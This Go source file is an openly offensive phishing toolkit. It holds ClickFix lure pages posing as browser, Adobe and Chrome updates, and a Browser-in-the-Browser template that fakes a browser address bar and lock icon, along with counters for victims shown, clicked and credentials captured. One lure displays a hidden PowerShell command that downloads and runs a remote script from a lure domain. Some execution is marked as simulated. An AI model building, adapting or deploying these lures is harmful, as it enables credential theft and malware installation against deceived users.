// Package phishing - Advanced Phishing Techniques
// Includes ClickFix, BITB, and modern attack vectors
package phishing

import (
	"crypto/rand"
	"fmt"
	"html/template"
	"math/big"
	"strings"
	"sync"

	"go.uber.org/zap"
)

// ============================================================================
// ClickFix Attack Module
// ============================================================================

type ClickFixConfig struct {
	Enabled         bool     `yaml:"enabled" env:"CLICKFIX_ENABLED"`
	Themes          []string `yaml:"themes"` // browser-update, adobe, chrome, etc.
	DetectionRate   float64  `yaml:"detection_rate"` // Как часто показывать жертве
	PowerShellExec bool     `yaml:"powershell_exec"` // Симуляция выполнения
}

type ClickFixAttack struct {
	config *ClickFixConfig
	logger *zap.Logger
	stats  *ClickFixStats
}

type ClickFixStats struct {
	mu           sync.RWMutex
	Shown        int64 `json:"shown"`
	Clicked      int64 `json:"clicked"`
	Executed     int64 `json:"executed"`
	Downloaded   int64 `json:"downloaded"`
}

func NewClickFixAttack(config *ClickFixConfig, logger *zap.Logger) *ClickFixAttack {
	return &ClickFixAttack{
		config: config,
		logger: logger,
		stats:  &ClickFixStats{},
	}
}

// ClickFix HTML Templates
var clickFixTemplates = map[string]string{
	"browser-update": `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Critical Security Update Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: #0f0f23; border-radius: 12px; padding: 40px; max-width: 500px; box-shadow: 0 25px 50px rgba(0,0,0,0.5); border: 1px solid #2d2d5a; }
        .icon { width: 80px; height: 80px; background: linear-gradient(135deg, #ff6b6b, #ee5a24); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
        .icon svg { width: 40px; height: 40px; fill: white; }
        h2 { color: #ff6b6b; font-size: 24px; margin-bottom: 15px; text-align: center; }
        p { color: #8b8b9e; font-size: 14px; line-height: 1.6; margin-bottom: 25px; text-align: center; }
        .code { background: #1a1a3e; padding: 15px; border-radius: 8px; font-family: 'Consolas', monospace; color: #00ff88; font-size: 12px; margin-bottom: 25px; overflow-x: auto; }
        .btn { display: block; width: 100%; padding: 15px 30px; background: linear-gradient(135deg, #00c6ff, #0072ff); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; text-align: center; text-decoration: none; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(0,114,255,0.4); }
        .btn:active { transform: translateY(0); }
        .footer { margin-top: 20px; font-size: 11px; color: #5a5a7e; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
        </div>
        <h2>Critical Security Update</h2>
        <p>Your browser has detected a critical security vulnerability. Immediate action is required to protect your account and data.</p>
        <div class="code" id="cmdCode">powershell -WindowStyle Hidden -Command "Invoke-Expression((New-Object Net.WebClient).DownloadString('https://update.security-service[.]xyz/patch'))"</div>
        <button class="btn" onclick="executeUpdate()">Update Now</button>
        <p class="footer">Security Scan ID: {{.ScanID}} | Protected by Windows Defender</p>
    </div>
    <script>
        function executeUpdate() {
            document.getElementById('cmdCode').style.display = 'block';
            // In real attack, this would execute the payload
            console.log('ClickFix executed');
        }
    </script>
</body>
</html>`,

	"adobe-update": `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Adobe Reader Update Required</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f0f0f0; padding: 40px; }
        .update-box { background: white; border-radius: 8px; padding: 30px; max-width: 500px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .btn { background: #ff0000; color: white; padding: 15px 30px; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body>
    <div class="update-box">
        <h2>Adobe Reader Update Required</h2>
        <p>A critical security update is available for Adobe Reader.</p>
        <button class="btn" onclick="install()">Download Update</button>
    </div>
    <script>
        function install() { alert('Installing update...'); }
    </script>
</body>
</html>`,

	"chrome-update": `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Chrome Update</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fff; padding: 40px; }
        .dialog { border: 1px solid #ccc; border-radius: 8px; padding: 20px; max-width: 450px; margin: 0 auto; }
        .btn { background: #4285f4; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="dialog">
        <h3>Chrome is out of date</h3>
        <p>Update Chrome for the latest security fixes.</p>
        <button class="btn" onclick="update()">Update Chrome</button>
    </div>
</body>
</html>`,
}

// Execute ClickFix attack
func (c *ClickFixAttack) Execute(theme string) (string, error) {
	template, ok := clickFixTemplates[theme]
	if !ok {
		template = clickFixTemplates["browser-update"]
	}

	// Generate unique scan ID
	scanID := generateScanID()

	// Replace placeholder
	result := strings.Replace(template, "{{.ScanID}}", scanID, 1)

	c.stats.mu.Lock()
	c.stats.Shown++
	c.stats.mu.Unlock()

	c.logger.Info("ClickFix displayed",
		zap.String("theme", theme),
		zap.String("scan_id", scanID))

	return result, nil
}

// OnClick handler
func (c *ClickFixAttack) OnClick() {
	c.stats.mu.Lock()
	c.stats.Clicked++
	c.stats.mu.Unlock()

	c.logger.Info("ClickFix clicked")
}

// OnExecute handler (simulated)
func (c *ClickFixAttack) OnExecute() {
	c.stats.mu.Lock()
	c.stats.Executed++
	c.stats.mu.Unlock()

	c.logger.Info("ClickFix executed (simulated)")
}

// GetStats returns ClickFix statistics
func (c *ClickFixAttack) GetStats() map[string]interface{} {
	c.stats.mu.RLock()
	defer c.stats.mu.RUnlock()

	return map[string]interface{}{
		"shown":      c.stats.Shown,
		"clicked":    c.stats.Clicked,
		"executed":   c.stats.Executed,
		"downloaded": c.stats.Downloaded,
		"click_rate": func() float64 {
			if c.stats.Shown == 0 {
				return 0
			}
			return float64(c.stats.Clicked) / float64(c.stats.Shown) * 100
		}(),
	}
}

// ============================================================================
// Browser-in-the-Browser (BITB) Attack
// ============================================================================

type BITBAttack struct {
	logger *zap.Logger
	config *BITBConfig
	stats  *BITBStats
}

type BITBConfig struct {
	Enabled       bool     `yaml:"enabled" env:"BITB_ENABLED"`
	IframeWidth  int      `yaml:"iframe_width" env:"BITB_IFRAME_WIDTH"`
	IframeHeight int      `yaml:"iframe_height" env:"BITB_IFRAME_HEIGHT"`
	TargetDomain string   `yaml:"target_domain" env:"BITB_TARGET_DOMAIN"`
}

type BITBStats struct {
	mu        sync.RWMutex
	Displayed int64 `json:"displayed"`
	Captured  int64 `json:"captured"`
}

// BITB HTML Template - mimics real browser address bar
var bitbTemplate = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{{.Title}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #202124; min-height: 100vh; font-family: Arial, sans-serif; }
        
        /* Fake Browser Chrome */
        .browser-chrome {
            background: #202124;
            border-bottom: 1px solid #5f6368;
            padding: 8px 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .window-controls { display: flex; gap: 8px; }
        .window-btn { width: 12px; height: 12px; border-radius: 50%; }
        .btn-close { background: #ff5f56; }
        .btn-min { background: #ffbd2e; }
        .btn-max { background: #27c93f; }
        
        /* Address Bar */
        .address-bar {
            flex: 1;
            background: #303134;
            border-radius: 20px;
            padding: 6px 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 0 12px;
        }
        
        .lock-icon { color: #4caf50; font-size: 14px; }
        .url { color: #e8eaed; font-size: 13px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        
        /* Fake Iframe Container */
        .iframe-container {
            position: relative;
            width: {{.Width}}px;
            height: {{.Height}}px;
            margin: 20px auto;
            border: none;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        
        /* The actual phishing iframe */
        .phishing-iframe {
            width: 100%;
            height: 100%;
            border: none;
            background: white;
        }
        
        /* Invisible overlay for credential capture */
        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: transparent;
            z-index: 10;
        }
    </style>
</head>
<body>
    <!-- Fake Browser Chrome -->
    <div class="browser-chrome">
        <div class="window-controls">
            <div class="window-btn btn-close"></div>
            <div class="window-btn btn-min"></div>
            <div class="window-btn btn-max"></div>
        </div>
        
        <div class="address-bar">
            <span class="lock-icon">🔒</span>
            <span class="url">{{.DisplayURL}}</span>
        </div>
    </div>
    
    <!-- Iframe Container -->
    <div class="iframe-container">
        <iframe class="phishing-iframe" src="{{.TargetURL}}"></iframe>
        <div class="overlay" id="overlay"></div>
    </div>
    
    <script>
        // Track interactions
        document.getElementById('overlay').addEventListener('click', function(e) {
            console.log('BITB click captured');
            // In real attack, would capture click coordinates
        });
        
        // Detect if user tries to copy URL
        document.addEventListener('copy', function(e) {
            console.log('URL copy attempt detected');
        });
        
        // Detect right-click
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            console.log('Right-click blocked');
        });
    </script>
</body>
</html>`

func NewBITBAttack(config *BITBConfig, logger *zap.Logger) *BITBAttack {
	return &BITBAttack{
		logger: logger,
		config: config,
		stats:  &BITBStats{},
	}
}

// Execute BITB attack
func (b *BITBAttack) Execute(targetURL, displayURL, title string) (string, error) {
	width := b.config.IframeWidth
	height := b.config.IframeHeight

	if width == 0 {
		width = 800
	}
	if height == 0 {
		height = 600
	}

	result := strings.Replace(bitbTemplate, "{{.Width}}", fmt.Sprintf("%d", width), 1)
	result = strings.Replace(result, "{{.Height}}", fmt.Sprintf("%d", height), 1)
	result = strings.Replace(result, "{{.TargetURL}}", targetURL, 1)
	result = strings.Replace(result, "{{.DisplayURL}}", displayURL, 1)
	result = strings.Replace(result, "{{.Title}}", title, 1)

	b.stats.mu.Lock()
	b.stats.Displayed++
	b.stats.mu.Unlock()

	b.logger.Info("BITB attack executed",
		zap.String("target", targetURL),
		zap.String("display", displayURL))

	return result, nil
}

// OnCredentialsCaptured - called when credentials are entered
func (b *BITBAttack) OnCredentialsCaptured() {
	b.stats.mu.Lock()
	b.stats.Captured++
	b.stats.mu.Unlock()

	b.logger.Info("BITB credentials captured")
}

// GetStats returns BITB statistics
func (b *BITBAttack) GetStats() map[string]interface{} {
	b.stats.mu.RLock()
	defer b.stats.mu.RUnlock()

	return map[string]interface{}{
		"displayed": b.stats.Displayed,
		"captured":  b.stats.Captured,
		"capture_rate": func() float64 {
			if b.stats.Displayed == 0 {
				return 0
			}
			return float64(b.stats.Captured) / float64(b.stats.Displayed) * 100
		}(),
	}
}

// ============================================================================
// Helper Functions
// ============================================================================

func generateScanID() string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, 12)
	for i := range result {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		result[i] = chars[n.Int64()]
	}
	return string(result)
}

// GenerateClickFixHTML generates ClickFix HTML with template
func GenerateClickFixHTML(theme string) (template.HTML, error) {
	cf := &ClickFixAttack{
		config: &ClickFixConfig{Themes: []string{theme}},
		logger: zap.NewNop(),
	}
	html, err := cf.Execute(theme)
	return template.HTML(html), err
}

// GenerateBITBHTML generates BITB HTML
func GenerateBITBHTML(targetURL, displayURL, title string, width, height int) (template.HTML, error) {
	bitb := &BITBAttack{
		config: &BITBConfig{
			IframeWidth:  width,
			IframeHeight: height,
		},
		logger: zap.NewNop(),
	}
	html, err := bitb.Execute(targetURL, displayURL, title)
	return template.HTML(html), err
}
